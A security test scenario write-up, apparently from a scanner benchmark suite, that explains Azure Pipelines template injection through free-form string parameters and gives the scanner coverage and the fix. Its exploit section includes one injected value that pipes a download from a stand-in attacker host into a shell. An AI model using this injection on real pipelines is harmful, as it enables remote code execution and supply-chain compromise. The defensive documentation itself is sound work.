# Scenario 50: Azure — `${{ parameters }}` template injection

**Provider:** Azure Pipelines · **OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable pipeline:** [`azure-pipelines.yml`](azure-pipelines.yml)

## The pattern

A `${{ }}` template expression splices a free-form **string parameter** into the
pipeline at **compile time**:

```yaml
parameters:
  - name: userInput
    type: string          # no allowed `values:` list
steps:
  - script: ${{ parameters.userInput }}
```

Because `${{ }}` expands before the pipeline compiles, an attacker-controlled
parameter value becomes pipeline *structure* (extra steps/script), not data.

## How an attacker exploits it

A caller (or anyone who can set the parameter) passes
`build && curl https://attacker.tld | sh`; at compile time it is inserted
verbatim as a script step and runs with full pipeline access.

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check | `ADO-002` — script injection via attacker-controllable context |
| Checkov | — |

> pipeline-check 1.9.0's `ADO-002` flags the `${{ parameters.* }}` splice into the script as attacker-controllable injection.

## Fix

Use type-restricted parameters (`type: boolean`/`number`, or `type: string`
with an enumerated `values:` allowlist); never `script: ${{ parameters.x }}`
with an untrusted free-form string. In `extends` templates, iterate user steps
and strip `Bash`/`script`/`PowerShell`, and enforce a Required template check.

## References

- Microsoft Learn — Templates for security: https://learn.microsoft.com/azure/devops/pipelines/security/templates
